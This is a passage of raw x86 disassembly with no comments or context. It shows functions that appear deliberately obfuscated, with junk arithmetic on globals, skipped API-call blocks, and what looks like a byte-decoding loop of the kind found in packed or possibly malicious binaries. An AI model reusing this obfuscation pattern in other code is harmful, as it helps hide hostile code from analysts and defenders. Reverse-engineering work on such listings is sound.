  41df5d:	call   0x41d307
  41df62:	push   ebx
  41df63:	lea    eax,[ebp-0x2]
  41df66:	push   eax
  41df67:	mov    eax,DWORD PTR [ebp+0x10]
  41df6a:	mov    ecx,DWORD PTR [ebp+0x14]
  41df6d:	shrd   eax,ecx,0x2
  41df71:	shr    ecx,0x2
  41df74:	mov    ecx,DWORD PTR [ebp+0x10]
  41df77:	mov    edx,DWORD PTR [ebp+0x14]
  41df7a:	xor    eax,esi
  41df7c:	xor    edx,edx
  41df7e:	or     eax,edx
  41df80:	add    eax,edi
  41df82:	push   eax
  41df83:	shl    ecx,0x1e
  41df86:	call   0x41d307
  41df8b:	mov    eax,DWORD PTR [ebp+0x10]
  41df8e:	mov    ecx,DWORD PTR [ebp+0x14]
  41df91:	shrd   eax,ecx,0x2
  41df95:	shr    ecx,0x2
  41df98:	mov    ecx,DWORD PTR [ebp+0x10]
  41df9b:	mov    edx,DWORD PTR [ebp+0x14]
  41df9e:	pop    edi
  41df9f:	xor    eax,esi
  41dfa1:	xor    edx,edx
  41dfa3:	pop    esi
  41dfa4:	shl    ecx,0x1e
  41dfa7:	or     eax,edx
  41dfa9:	pop    ebx
  41dfaa:	leave  
  41dfab:	ret    0x10
  41dfae:	mov    eax,DWORD PTR [esp+0x8]
  41dfb2:	mov    ecx,DWORD PTR [esp+0x10]
  41dfb6:	xor    DWORD PTR ds:0x4228ba,0x2ee8
  41dfc0:	or     ecx,eax
  41dfc2:	not    ecx
  41dfc4:	mov    ecx,DWORD PTR [esp+0xc]
  41dfc8:	mov    DWORD PTR ds:0x422936,0x71b
  41dfd2:	jne    0x41e066
  41dfd8:	cmp    DWORD PTR ds:0x422936,0x0
  41dfdf:	not    DWORD PTR ds:0x42292a
  41dfe5:	mov    DWORD PTR ds:0x42291a,0x73d7
  41dfef:	mov    DWORD PTR ds:0x4229ce,0x27c3
  41dff9:	jmp    0x41e05d
  41dffe:	mov    eax,0x55fe
  41e003:	jge    0x41e04d
  41e009:	push   0x626f
  41e00e:	push   DWORD PTR [ebp-0x10]
  41e011:	push   DWORD PTR [ebp-0x10]
  41e014:	push   DWORD PTR [ebp-0x14]
  41e017:	push   DWORD PTR [ebp-0x14]
  41e01a:	push   0x6abc
  41e01f:	call   DWORD PTR ds:0x42a194
  41e025:	sbb    DWORD PTR ds:0x42295e,0x422926
  41e02f:	xor    DWORD PTR ds:0x4228de,0x422996
  41e039:	or     DWORD PTR ds:0x4229b2,0x422932
  41e043:	or     DWORD PTR ds:0x422906,0x42298e
  41e04d:	or     DWORD PTR ds:0x4229a2,0x766e
  41e057:	sbb    DWORD PTR ds:0x422996,ebx
  41e05d:	mov    eax,DWORD PTR [esp+0x4]
  41e061:	mul    ecx
  41e063:	ret    0x10
  41e066:	push   ebx
  41e067:	mul    ecx
  41e069:	mov    ebx,eax
  41e06b:	mov    eax,DWORD PTR [esp+0x8]
  41e06f:	mul    DWORD PTR [esp+0x14]
  41e073:	add    ebx,eax
  41e075:	mov    eax,DWORD PTR [esp+0x8]
  41e079:	mul    ecx
  41e07b:	add    edx,ebx
  41e07d:	pop    ebx
  41e07e:	ret    0x10
  41e081:	push   ebp
  41e082:	mov    ebp,esp
  41e084:	sub    esp,0x30
  41e087:	push   ebx
  41e088:	push   esi
  41e089:	push   edi
  41e08a:	mov    DWORD PTR [ebp-0xc],0x1d4c
  41e091:	mov    DWORD PTR [ebp-0x8],0x1c4a
  41e098:	mov    DWORD PTR [ebp-0x4],0x73ba
  41e09f:	mov    DWORD PTR [ebp-0x1c],0x7afa
  41e0a6:	mov    DWORD PTR [ebp-0x18],0x618d
  41e0ad:	mov    DWORD PTR [ebp-0x14],0x7b8c
  41e0b4:	mov    DWORD PTR [ebp-0x10],0x46ba
  41e0bb:	mov    DWORD PTR [ebp-0x30],0x6996
  41e0c2:	mov    DWORD PTR [ebp-0x2c],0x3bbb
  41e0c9:	mov    DWORD PTR [ebp-0x28],0x571e
  41e0d0:	mov    DWORD PTR [ebp-0x24],0x46e5
  41e0d7:	mov    ecx,DWORD PTR [ebp-0x14]
  41e0da:	imul   ecx,ecx,0x7649
  41e0e0:	add    ecx,DWORD PTR [ebp-0x18]
  41e0e3:	xor    edx,edx
  41e0e5:	add    ecx,DWORD PTR [ebp-0x1c]
  41e0e8:	mov    eax,DWORD PTR [ebp-0x4]
  41e0eb:	mov    esi,DWORD PTR [ebp-0x8]
  41e0ee:	sub    eax,0x3049
  41e0f3:	imul   eax,eax,0x585
  41e0f9:	add    eax,0x46ca
  41e0fe:	xor    ecx,0x3916a43d
  41e104:	div    esi
  41e106:	mov    edi,0x2a7c
  41e10b:	mov    esi,0x2cea
  41e110:	jmp    0x41e1a7
  41e115:	mov    DWORD PTR [ebp-0x20],0xeaf
  41e11c:	mov    DWORD PTR [ebp-0x14],0x6627
  41e123:	mov    DWORD PTR [ebp-0x18],0x2899
  41e12a:	mov    DWORD PTR [ebp-0x1c],0x4f7d
  41e131:	mov    eax,DWORD PTR [ebp-0x1c]
  41e134:	mov    edx,DWORD PTR [ebp-0x18]
  41e137:	or     eax,edx
  41e139:	mov    edx,DWORD PTR [ebp-0x14]
  41e13c:	imul   eax,edx
  41e13f:	add    eax,DWORD PTR [ebp-0x20]
  41e142:	xor    edx,edx
  41e144:	mov    ebx,0x5ceb
  41e149:	div    ebx
  41e14b:	mov    ebx,DWORD PTR [ebp+0x8]
  41e14e:	mov    edx,ecx
  41e150:	xor    eax,0x4050
  41e155:	sub    edx,eax
  41e157:	mov    DWORD PTR [ebp-0x20],edx
  41e15a:	mov    eax,DWORD PTR [ebp-0x24]
  41e15d:	mov    dl,BYTE PTR [ebp+0xc]
  41e160:	xor    al,0xd1
  41e162:	sub    dl,al
  41e164:	mov    eax,DWORD PTR [ebp-0x28]
  41e167:	sub    dl,al
  41e169:	mov    eax,DWORD PTR [ebp-0x20]
  41e16c:	add    dl,0x52
  41e16f:	mov    BYTE PTR [eax+ebx*1],dl
  41e172:	mov    eax,DWORD PTR [ebp-0x2c]
  41e175:	sub    eax,0x421
  41e17a:	and    eax,0xd30
  41e17f:	add    eax,DWORD PTR [ebp-0x30]
  41e182:	xor    edx,edx
  41e184:	mov    ebx,0x6ea6
  41e189:	div    ebx
  41e18b:	xor    edx,edx
  41e18d:	add    ecx,eax
  41e18f:	mov    eax,DWORD PTR [ebp-0x4]
  41e192:	mov    ebx,DWORD PTR [ebp-0x8]
  41e195:	sub    eax,0x3049
  41e19a:	imul   eax,eax,0x585
  41e1a0:	add    eax,0x46ca
  41e1a5:	div    ebx
  41e1a7:	mov    edx,DWORD PTR [ebp-0xc]
  41e1aa:	xor    eax,edx
  41e1ac:	mov    edx,0x1086
  41e1b1:	sub    edx,eax
  41e1b3:	mov    eax,DWORD PTR [ebp-0x10]
  41e1b6:	and    eax,0x4a00
  41e1bb:	or     eax,0x20
  41e1be:	sub    eax,edi
  41e1c0:	xor    eax,esi
  41e1c2:	mov    ebx,ecx
  41e1c4:	sub    ebx,eax
  41e1c6:	cmp    ebx,edx
  41e1c8:	jbe    0x41e115
  41e1ce:	pop    edi
  41e1cf:	pop    esi
  41e1d0:	pop    ebx
  41e1d1:	leave  
  41e1d2:	ret    0x8
  41e1d5:	push   ebp
  41e1d6:	mov    ebp,esp
  41e1d8:	and    esp,0xfffffff8
  41e1db:	sub    esp,0x8c
  41e1e1:	push   ebx
  41e1e2:	push   esi
  41e1e3:	push   edi
  41e1e4:	push   0xa
  41e1e6:	push   DWORD PTR ds:0x4220dc
  41e1ec:	push   DWORD PTR ds:0x4220dc
  41e1f2:	call   DWORD PTR ds:0x42a004
  41e1f8:	test   eax,eax
  41e1fa:	jle    0x41e207
  41e200:	xor    eax,eax
  41e202:	jmp    0x41f82b
  41e207:	mov    DWORD PTR [esp+0x38],0x10b8
  41e20f:	or     DWORD PTR ds:0x4229b6,edx
  41e215:	mov    DWORD PTR [esp+0x3c],0x31bb
  41e21d:	adc    ecx,ecx
  41e21f:	mov    DWORD PTR [esp+0x40],0x2114
  41e227:	mov    DWORD PTR [esp+0x44],0xfe7
  41e22f:	cmp    DWORD PTR ds:0x4229c6,0x0
  41e236:	mov    ecx,DWORD PTR ds:0x422996
  41e23c:	not    ecx
  41e23e:	jmp    0x41e2a1
  41e243:	mov    eax,0x3d56
  41e248:	jb     0x41e285
  41e24e:	push   0x4229ce
  41e253:	push   0x3b50
  41e258:	push   0x1b8c
  41e25d:	push   DWORD PTR [ebp-0x10]
  41e260:	push   DWORD PTR [ebp-0x14]
  41e263:	push   0x153f
  41e268:	push   DWORD PTR [ebp-0x24]
  41e26b:	call   DWORD PTR ds:0x42a070
  41e271:	not    ecx
  41e273:	add    ecx,ecx
  41e275:	sbb    DWORD PTR ds:0x4228aa,0x4228c2
  41e27f:	or     DWORD PTR ds:0x42298a,ebx
  41e285:	add    ecx,ecx
  41e287:	sbb    DWORD PTR ds:0x42289e,0x422946
  41e291:	xor    ecx,ecx
  41e293:	xor    ecx,ecx
  41e295:	or     ecx,DWORD PTR ds:0x42292e
  41e29b:	add    DWORD PTR ds:0x4229b2,ecx
  41e2a1:	mov    DWORD PTR [esp+0x18],0xac404108
  41e2a9:	cmp    DWORD PTR ds:0x422922,0x0
  41e2b0:	mov    DWORD PTR ds:0x4229ce,0x2ada
  41e2ba:	mov    DWORD PTR ds:0x42297a,edi
  41e2c0:	jmp    0x41e321
  41e2c5:	not    DWORD PTR ds:0x42290a
  41e2cb:	mov    DWORD PTR ds:0x42288a,0x279a
  41e2d5:	jbe    0x41e309
  41e2db:	push   0x4226b9
  41e2e0:	call   DWORD PTR ds:0x42a074
  41e2e6:	add    ecx,ecx
  41e2e8:	movzx  ecx,BYTE PTR ds:0x4229a6
  41e2ef:	and    DWORD PTR ds:0x42290e,ecx
  41e2f5:	and    DWORD PTR ds:0x42298e,edi
  41e2fb:	xor    ecx,ecx
  41e2fd:	xor    ecx,DWORD PTR ds:0x422932
  41e303:	or     DWORD PTR ds:0x422992,ecx
  41e309:	add    ecx,DWORD PTR ds:0x4228aa
  41e30f:	xor    ecx,0xa66
  41e315:	or     DWORD PTR ds:0x4228da,edi
  41e31b:	sub    eax,DWORD PTR ds:0x4229ba
  41e321:	mov    DWORD PTR [esp+0x1c],0x1002
  41e329:	or     eax,eax
  41e32b:	mov    DWORD PTR [esp+0x10],0x9aa
  41e333:	xor    eax,eax
  41e335:	xor    eax,DWORD PTR ds:0x4229e2
  41e33b:	mov    ecx,DWORD PTR ds:0x422abe
  41e341:	sub    ecx,eax
  41e343:	and    eax,DWORD PTR [eax+ecx*1]
  41e346:	push   0x61f6
  41e34b:	cmp    DWORD PTR ds:0x4228ee,0x0
  41e352:	mov    DWORD PTR ds:0x42295e,0x401d
  41e35c:	mov    DWORD PTR ds:0x422972,ebx
  41e362:	mov    ecx,0x5ee5
  41e367:	jmp    0x41e3cf
  41e36c:	mov    DWORD PTR ds:0x4228ae,ebx
  41e372:	mov    DWORD PTR ds:0x4228f2,0x622c
  41e37c:	ja     0x41e3b3
  41e382:	push   0x67cd
  41e387:	push   DWORD PTR [ebp-0x24]
  41e38a:	push   0x11c0
  41e38f:	call   DWORD PTR ds:0x42a078
  41e395:	sub    DWORD PTR ds:0x4228e2,0x2f74
  41e39f:	xor    ecx,ecx
  41e3a1:	add    ecx,DWORD PTR ds:0x422922
  41e3a7:	xor    ecx,DWORD PTR ds:0x4228da
  41e3ad:	mov    DWORD PTR ds:0x422922,ecx
  41e3b3:	sub    ecx,0x1bd0
  41e3b9:	mov    ecx,DWORD PTR ds:0x422986
  41e3bf:	adc    DWORD PTR ds:0x42288e,ecx
  41e3c5:	or     DWORD PTR ds:0x42294a,0xc71
  41e3cf:	mov    DWORD PTR [esp+0x18],0x747
  41e3d7:	mov    eax,DWORD PTR [esp+0x14]
  41e3db:	or     ecx,DWORD PTR ds:0x4228be
  41e3e1:	mov    ecx,DWORD PTR [esp+0x18]
  41e3e5:	push   0x1caf
  41e3ea:	sub    DWORD PTR ds:0x4228ae,0x2516
  41e3f4:	push   ecx
  41e3f5:	sub    DWORD PTR ds:0x422916,0x4228e6
  41e3ff:	push   eax
  41e400:	call   0x41dfae
  41e405:	sbb    DWORD PTR ds:0x4228ce,0x6aff
  41e40f:	mov    ecx,DWORD PTR [esp+0x18]
  41e413:	mov    esi,DWORD PTR ds:0x422946
  41e419:	sub    DWORD PTR ds:0x4228be,esi
  41e41f:	mov    esi,DWORD PTR [esp+0x1c]
  41e423:	sbb    DWORD PTR ds:0x4229d2,0x42291a
  41e42d:	push   esi
  41e42e:	sbb    DWORD PTR ds:0x42299a,0x3dc6
  41e438:	push   ecx
  41e439:	add    DWORD PTR ds:0x4228a2,0x422972
  41e443:	push   edx
  41e444:	push   eax
  41e445:	sbb    DWORD PTR ds:0x4228de,0x749b
  41e44f:	call   0x421af3
  41e454:	mov    ecx,DWORD PTR [esp+0x40]
  41e458:	sub    esi,DWORD PTR ds:0x42291a
  41e45e:	mov    esi,DWORD PTR [esp+0x44]
  41e462:	sub    DWORD PTR ds:0x42288a,0x2899
  41e46c:	add    eax,ecx
  41e46e:	mov    DWORD PTR ds:0x422956,0x3eb8
  41e478:	mov    ecx,DWORD PTR [esp+0x38]
  41e47c:	adc    edx,esi
  41e47e:	mov    esi,DWORD PTR [esp+0x3c]
  41e482:	sub    DWORD PTR ds:0x4228da,0x4228fa
  41e48c:	xor    eax,ecx
  41e48e:	dec    DWORD PTR ds:0x4229c6
  41e494:	mov    DWORD PTR [esp+0x40],eax
  41e498:	xor    edx,esi
  41e49a:	mov    DWORD PTR [esp+0x44],edx
  41e49e:	or     DWORD PTR ds:0x42292e,ecx
  41e4a4:	mov    DWORD PTR [esp+0x18],0x6cd4
  41e4ac:	mov    DWORD PTR [esp+0x1c],0x5497
  41e4b4:	mov    DWORD PTR [esp+0x10],0x36dd
  41e4bc:	xor    ecx,DWORD PTR ds:0x42289a
  41e4c2:	mov    DWORD PTR [esp+0x14],0x78dd
  41e4ca:	cmp    DWORD PTR ds:0x422956,0x0
  41e4d1:	mov    DWORD PTR ds:0x422902,0x537a
  41e4db:	mov    DWORD PTR ds:0x42289a,ebx
  41e4e1:	not    ecx
  41e4e3:	jmp    0x41e543
  41e4e8:	mov    DWORD PTR ds:0x4229aa,0x24bb
  41e4f2:	mov    ecx,0x50b
  41e4f7:	jle    0x41e52d
  41e4fd:	push   0x40ba
  41e502:	push   0x4c3a
  41e507:	push   DWORD PTR [ebp-0x20]
  41e50a:	push   0x19f6
  41e50f:	push   DWORD PTR [ebp-0x28]
  41e512:	push   0x29a0
  41e517:	call   DWORD PTR ds:0x42a2a8
  41e51d:	adc    DWORD PTR ds:0x4228fe,0x2e50
  41e527:	or     DWORD PTR ds:0x4229b2,edx
  41e52d:	sub    DWORD PTR ds:0x422956,edi
  41e533:	add    DWORD PTR ds:0x422926,0x2a5
  41e53d:	or     DWORD PTR ds:0x422916,ebx
  41e543:	mov    DWORD PTR [esp+0x38],0x3985
  41e54b:	cmp    DWORD PTR ds:0x4228d6,0x0
  41e552:	mov    DWORD PTR ds:0x4228c2,ecx
  41e558:	mov    ecx,DWORD PTR ds:0x4228a2
  41e55e:	jmp    0x41e5a5
  41e563:	not    eax
  41e565:	je     0x41e58d
  41e56b:	push   DWORD PTR [ebp-0x10]
  41e56e:	push   0x8599
  41e573:	push   DWORD PTR [ebp-0x24]
  41e576:	push   0x24de
  41e57b:	call   DWORD PTR ds:0x42a2ac
  41e581:	sub    DWORD PTR ds:0x4228fe,ebx
  41e587:	and    ecx,0x2884
  41e58d:	and    ecx,0x5007
  41e593:	sub    DWORD PTR ds:0x422892,edi
  41e599:	adc    DWORD PTR ds:0x42295e,ebx
  41e59f:	neg    DWORD PTR ds:0x42296e
  41e5a5:	push   0x0
  41e5a7:	not    eax
  41e5a9:	mov    DWORD PTR [esp+0x40],0x1dd2
  41e5b1:	movzx  ecx,WORD PTR ds:0x422892
  41e5b8:	and    ecx,DWORD PTR ds:0x4228e2
  41e5be:	mov    DWORD PTR ds:0x422892,ecx
  41e5c4:	mov    eax,DWORD PTR [esp+0x3c]
  41e5c8:	or     DWORD PTR ds:0x42292a,ecx
  41e5ce:	mov    ecx,DWORD PTR [esp+0x40]
  41e5d2:	adc    DWORD PTR ds:0x4228a6,0x44d3
  41e5dc:	push   0x5af1c38e
  41e5e1:	push   ecx
  41e5e2:	neg    DWORD PTR ds:0x4228a2
  41e5e8:	push   eax
  41e5e9:	not    DWORD PTR ds:0x4228e2
  41e5ef:	call   0x421af3
  41e5f4:	mov    ecx,DWORD PTR [esp+0x10]
  41e5f8:	movzx  esi,BYTE PTR ds:0x4228fe
  41e5ff:	add    esi,DWORD PTR ds:0x4229aa
  41e605:	mov    DWORD PTR ds:0x4228fe,esi
  41e60b:	mov    esi,DWORD PTR [esp+0x14]
  41e60f:	sub    DWORD PTR ds:0x42293e,0x4228e6
  41e619:	push   esi
  41e61a:	or     DWORD PTR ds:0x42290e,0x4229ba
  41e624:	push   ecx
  41e625:	adc    DWORD PTR ds:0x4229ce,0x4228a2
  41e62f:	push   edx
  41e630:	add    DWORD PTR ds:0x422982,0x422926
  41e63a:	push   eax
  41e63b:	mov    DWORD PTR ds:0x422972,0x6150
  41e645:	call   0x41dfae
  41e64a:	and    esi,DWORD PTR ds:0x4228e6
  41e650:	mov    ecx,DWORD PTR [esp+0x18]
  41e654:	cmp    DWORD PTR ds:0x4228d2,0x0
  41e65b:	mov    esi,0x2802
  41e660:	mov    esi,DWORD PTR ds:0x42290e
  41e666:	jmp    0x41e6df
  41e66b:	mov    DWORD PTR ds:0x42292e,edx
  41e671:	mov    DWORD PTR ds:0x42298a,0x21bd
  41e67b:	ja     0x41e6cc
  41e681:	push   0x422835
  41e686:	push   DWORD PTR [ebp-0x24]
  41e689:	push   DWORD PTR [ebp-0x28]
  41e68c:	push   0x295c
  41e691:	push   0x31b0
  41e696:	call   DWORD PTR ds:0x42a2b0
  41e69c:	or     DWORD PTR ds:0x422936,0x4228ba
  41e6a6:	movzx  esi,WORD PTR ds:0x42292a
  41e6ad:	add    esi,DWORD PTR ds:0x4229aa
  41e6b3:	mov    DWORD PTR ds:0x42292a,esi
  41e6b9:	movzx  esi,BYTE PTR ds:0x42290a
  41e6c0:	add    DWORD PTR ds:0x4229ba,esi
  41e6c6:	sub    DWORD PTR ds:0x422896,ecx
  41e6cc:	movzx  esi,BYTE PTR ds:0x4228ea
  41e6d3:	sub    DWORD PTR ds:0x4229be,esi
  41e6d9:	adc    DWORD PTR ds:0x42295a,ecx
  41e6df:	mov    esi,DWORD PTR [esp+0x1c]
  41e6e3:	xor    eax,ecx
  41e6e5:	add    DWORD PTR ds:0x4228ce,ecx
  41e6eb:	mov    ecx,DWORD PTR [esp+0x40]
  41e6ef:	or     DWORD PTR ds:0x4229c2,0x4228c2
  41e6f9:	xor    edx,esi
  41e6fb:	xor    DWORD PTR ds:0x422946,ebx
  41e701:	mov    esi,DWORD PTR [esp+0x44]
  41e705:	sbb    DWORD PTR ds:0x4228d6,0x42295e
  41e70f:	xor    eax,0x6e4d
  41e714:	adc    DWORD PTR ds:0x422966,0x4228c2
  41e71e:	xor    edx,0x79dc
  41e724:	cmp    ecx,eax
  41e726:	jne    0x41ece9
  41e72c:	cmp    esi,edx
  41e72e:	mov    DWORD PTR ds:0x422956,0x607f
  41e738:	jne    0x41ece9
  41e73e:	sbb    ecx,eax
  41e740:	mov    DWORD PTR [esp+0x40],0x7b6e
  41e748:	and    DWORD PTR ds:0x422982,0x281d
  41e752:	mov    DWORD PTR [esp+0x18],0x1856
  41e75a:	dec    ecx
  41e75b:	mov    DWORD PTR [esp+0x10],0x6e3c
  41e763:	mov    eax,DWORD PTR [esp+0x10]
  41e767:	inc    ecx
  41e768:	imul   eax,eax,0x2801
  41e76e:	mov    ecx,DWORD PTR ds:0x422a6a
  41e774:	mov    ecx,DWORD PTR [ecx]
  41e776:	and    DWORD PTR ds:0x422922,ecx
  41e77c:	xor    edx,edx
  41e77e:	sbb    DWORD PTR ds:0x42289e,ebx
  41e784:	mov    ecx,0x5f48
  41e789:	div    ecx
  41e78b:	push   DWORD PTR ds:0x3b8dcfc0
  41e791:	xor    edx,edx
  41e793:	adc    DWORD PTR ds:0x42290e,0x3f8e
  41e79d:	and    eax,0x54fe
  41e7a2:	xor    eax,0x283cecf3
  41e7a7:	cmp    DWORD PTR ds:0x4228a2,0x0
  41e7ae:	mov    ecx,0x4c91
  41e7b3:	mov    DWORD PTR ds:0x422972,0x3523
  41e7bd:	mov    ecx,DWORD PTR ds:0x42288e
  41e7c3:	jmp    0x41e831
  41e7c8:	mov    DWORD PTR ds:0x4229c2,0x3b0c
  41e7d2:	mov    DWORD PTR ds:0x4228de,0x3b7b
  41e7dc:	jbe    0x41e80f
  41e7e2:	push   DWORD PTR [ebp-0x18]
  41e7e5:	push   0x2888
  41e7ea:	push   0x7bd5
  41e7ef:	push   0x6538
  41e7f4:	push   0x7c45
  41e7f9:	call   DWORD PTR ds:0x42a2b4
  41e7ff:	and    DWORD PTR ds:0x42295a,0x2f05
  41e809:	xor    ecx,0x75ac
  41e80f:	or     ecx,DWORD PTR ds:0x42288e
  41e815:	sbb    DWORD PTR ds:0x42298a,ebx
  41e81b:	mov    ecx,DWORD PTR ds:0x4228ba
  41e821:	sbb    DWORD PTR ds:0x422892,ecx
  41e827:	sub    DWORD PTR ds:0x4229d2,0x2cc7
  41e831:	push   DWORD PTR [eax]
  41e833:	cmp    DWORD PTR ds:0x42288a,0x0
  41e83a:	mov    ecx,0x2a8f
  41e83f:	mov    DWORD PTR ds:0x4228d2,0x62da
  41e849:	mov    DWORD PTR ds:0x4228b2,0x461d
  41e853:	jmp    0x41e88b
  41e858:	not    eax
  41e85a:	mov    eax,0x1aaa
  41e85f:	jle    0x41e87f
  41e865:	push   DWORD PTR [ebp-0x14]
  41e868:	push   0x689c
  41e86d:	call   DWORD PTR ds:0x42a2b8
  41e873:	and    ecx,DWORD PTR ds:0x4228ce
  41e879:	add    DWORD PTR ds:0x4228c2,ecx
  41e87f:	sbb    DWORD PTR ds:0x42299e,ecx
  41e885:	sbb    ecx,0xe30
  41e88b:	mov    eax,DWORD PTR [esp+0x20]
  41e88f:	push   0xb
  41e891:	pop    ecx
  41e892:	div    ecx
  41e894:	sub    ecx,0x60ba
  41e89a:	mov    ecx,DWORD PTR [esp+0x48]
  41e89e:	not    DWORD PTR ds:0x4228b6
  41e8a4:	sub    eax,ecx
  41e8a6:	adc    DWORD PTR ds:0x4229ca,0x4229b6
  41e8b0:	add    eax,0x4d1
  41e8b5:	sbb    DWORD PTR ds:0x422992,0x4228aa
  41e8bf:	imul   eax,eax,0xfffffb44
  41e8c5:	and    eax,0xd55
  41e8ca:	xor    eax,0xf6b6e30e
  41e8cf:	push   DWORD PTR [eax]
  41e8d1:	add    DWORD PTR ds:0x42293e,0x4401
  41e8db:	push   DWORD PTR ds:0x3747636f
  41e8e1:	push   DWORD PTR ds:0xc7c2f83b
  41e8e7:	or     DWORD PTR ds:0x422926,0x64ef
  41e8f1:	push   DWORD PTR ds:0xe8d8887e
  41e8f7:	push   DWORD PTR ds:0x1e049617
  41e8fd:	xor    DWORD PTR ds:0x4228b2,0x4229ae
  41e907:	call   DWORD PTR ds:0x42a030
  41e90d:	not    eax
  41e90f:	mov    DWORD PTR [esp+0x18],0xac269
  41e917:	cmp    DWORD PTR ds:0x422992,0x0
  41e91e:	mov    ecx,DWORD PTR ds:0x4228d2
  41e924:	mov    ecx,0x4e69
  41e929:	not    ecx
  41e92b:	jmp    0x41e97b
  41e930:	not    DWORD PTR ds:0x4228d2
  41e936:	mov    DWORD PTR ds:0x4228ee,0x6c90
  41e940:	jb     0x41e975
  41e946:	push   0x7f87
  41e94b:	push   DWORD PTR [ebp-0x1c]
  41e94e:	push   0x186c
  41e953:	push   DWORD PTR [ebp-0x10]
  41e956:	push   DWORD PTR [ebp-0x1c]
  41e959:	call   DWORD PTR ds:0x42a07c
  41e95f:	adc    DWORD PTR ds:0x422962,0x439a
  41e969:	sbb    ecx,ecx
  41e96b:	or     DWORD PTR ds:0x4229b6,0x7fc4
  41e975:	sbb    ecx,ecx
  41e977:	add    ecx,ecx
  41e979:	or     ecx,ecx
  41e97b:	mov    DWORD PTR [esp+0x10],0x5886
  41e983:	mov    ecx,DWORD PTR [esp+0x10]
  41e987:	sub    DWORD PTR ds:0x4228e6,ebx
  41e98d:	mov    eax,0x2f60
  41e992:	xor    DWORD PTR ds:0x4228be,0x78d1
  41e99c:	sub    eax,ecx
  41e99e:	movzx  ecx,BYTE PTR ds:0x422952
  41e9a5:	sbb    ecx,DWORD PTR ds:0x4228a6
  41e9ab:	mov    DWORD PTR ds:0x422952,ecx
  41e9b1:	mov    ecx,DWORD PTR [esp+0x18]
  41e9b5:	xor    eax,0x4eb0
  41e9ba:	xor    DWORD PTR ds:0x42293a,0x31dd
  41e9c4:	xor    edx,edx
  41e9c6:	or     DWORD PTR ds:0x422952,0x422962
  41e9d0:	div    ecx
  41e9d2:	imul   eax,eax,0x79e
  41e9d8:	inc    DWORD PTR ds:0x422956
  41e9de:	xor    eax,0x7f8a
  41e9e3:	sbb    DWORD PTR ds:0x422906,0x77b7
  41e9ed:	push   DWORD PTR [eax+0x66d98445]
  41e9f3:	or     DWORD PTR ds:0x4228a6,0x1e7d
  41e9fd:	push   DWORD PTR ds:0x4af06c36
  41ea03:	sbb    DWORD PTR ds:0x4228ae,0x4228be
  41ea0d:	call   DWORD PTR ds:0x42a33c
  41ea13:	and    DWORD PTR ds:0x42294a,edi
  41ea19:	mov    DWORD PTR [esp+0x10],0xd8e5515f
  41ea21:	cmp    DWORD PTR ds:0x4228ba,0x0
  41ea28:	mov    ecx,0x55dc
  41ea2d:	mov    DWORD PTR ds:0x42292a,0x378a
  41ea37:	not    DWORD PTR ds:0x422892
  41ea3d:	jmp    0x41eab2
  41ea42:	mov    DWORD PTR ds:0x4228fe,0x78ab
  41ea4c:	mov    DWORD PTR ds:0x4228ba,0x7a87
  41ea56:	jb     0x41ea84
  41ea5c:	push   DWORD PTR [ebp-0x10]
  41ea5f:	push   0x211a
  41ea64:	push   DWORD PTR [ebp-0xc]
  41ea67:	push   DWORD PTR [ebp-0x20]
  41ea6a:	call   DWORD PTR ds:0x42a080
  41ea70:	and    DWORD PTR ds:0x42295e,edx
  41ea76:	or     esi,ecx
  41ea78:	or     esi,DWORD PTR ds:0x422906
  41ea7e:	and    DWORD PTR ds:0x4229b6,edi
  41ea84:	adc    DWORD PTR ds:0x422956,0x422932
  41ea8e:	xor    ecx,ecx
  41ea90:	xor    ecx,DWORD PTR ds:0x422a9e
  41ea96:	xor    esi,esi
  41ea98:	xor    esi,DWORD PTR ds:0x422b16
  41ea9e:	sub    ecx,esi
  41eaa0:	add    ecx,DWORD PTR [ecx+esi*1]
  41eaa3:	sub    ecx,ecx
  41eaa5:	movzx  esi,WORD PTR ds:0x42290a
  41eaac:	and    DWORD PTR ds:0x4228fe,esi
  41eab2:	mov    DWORD PTR [esp+0x14],0x0
  41eaba:	cmp    DWORD PTR ds:0x4228f2,0x0
  41eac1:	movzx  esi,BYTE PTR ds:0x4228fa
  41eac8:	not    esi
  41eaca:	mov    DWORD PTR ds:0x42290e,0x4dc8
  41ead4:	jmp    0x41eb3d
  41ead9:	mov    esi,DWORD PTR ds:0x4228b2
  41eadf:	not    eax
  41eae1:	jg     0x41eb1e
  41eae7:	push   0x0
  41eae9:	push   0x36d5
  41eaee:	push   0x10b0
  41eaf3:	call   DWORD PTR ds:0x42a2bc
  41eaf9:	and    edx,0x7f12
  41eaff:	dec    ecx
  41eb00:	mov    edx,DWORD PTR ds:0x42291a
  41eb06:	or     edx,DWORD PTR ds:0x4228a2
  41eb0c:	mov    DWORD PTR ds:0x42291a,edx
  41eb12:	mov    edx,DWORD PTR ds:0x4228e6
  41eb18:	or     DWORD PTR ds:0x4228a6,edx
  41eb1e:	mov    edx,DWORD PTR ds:0x42296e
  41eb24:	add    DWORD PTR ds:0x4229c6,edx
  41eb2a:	movzx  edx,WORD PTR ds:0x42296a
  41eb31:	and    edx,DWORD PTR ds:0x422892
  41eb37:	mov    DWORD PTR ds:0x42296a,edx
  41eb3d:	mov    DWORD PTR [esp+0x38],0x9f7
  41eb45:	cmp    DWORD PTR ds:0x42292e,0x0
  41eb4c:	mov    DWORD PTR ds:0x4228c6,0x484a
  41eb56:	mov    DWORD PTR ds:0x42289a,edi
  41eb5c:	mov    esi,DWORD PTR ds:0x4228ce
  41eb62:	mov    DWORD PTR ds:0x42298e,ebx
  41eb68:	jmp    0x41ebd3
  41eb6d:	mov    DWORD PTR ds:0x422962,edi
  41eb73:	mov    DWORD PTR ds:0x4228f2,ebx
  41eb79:	jb     0x41eba8
  41eb7f:	push   0x3714
  41eb84:	push   DWORD PTR [ebp-0x1c]
  41eb87:	push   DWORD PTR [ebp-0x28]
  41eb8a:	push   0x3c2f
  41eb8f:	call   DWORD PTR ds:0x42a2c0
  41eb95:	movzx  edx,BYTE PTR ds:0x422976
  41eb9c:	and    DWORD PTR ds:0x4228de,edx
  41eba2:	and    DWORD PTR ds:0x4228d2,ecx
  41eba8:	mov    ecx,DWORD PTR ds:0x422aba
  41ebae:	mov    edx,DWORD PTR ds:0x422ac6
  41ebb4:	sub    edx,ecx
  41ebb6:	sub    ecx,DWORD PTR [ecx+edx*1]
  41ebb9:	adc    DWORD PTR ds:0x4228ea,ebx
  41ebbf:	xor    ecx,ecx
  41ebc1:	xor    ecx,DWORD PTR ds:0x422962
  41ebc7:	adc    DWORD PTR ds:0x4228ba,ecx
  41ebcd:	xor    ecx,DWORD PTR ds:0x42297a
